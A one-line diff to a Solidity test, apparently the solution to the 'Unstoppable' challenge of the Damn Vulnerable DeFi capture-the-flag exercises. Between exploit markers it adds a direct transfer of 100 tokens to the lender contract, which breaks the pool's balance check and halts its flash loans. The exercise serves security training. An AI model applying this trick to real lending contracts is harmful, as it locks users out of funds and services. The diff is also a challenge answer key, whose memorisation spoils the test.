@@ -60,6 +60,7 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        dvt.transfer(address(unstoppableLender), 100);
         /**
          * EXPLOIT END *
          */
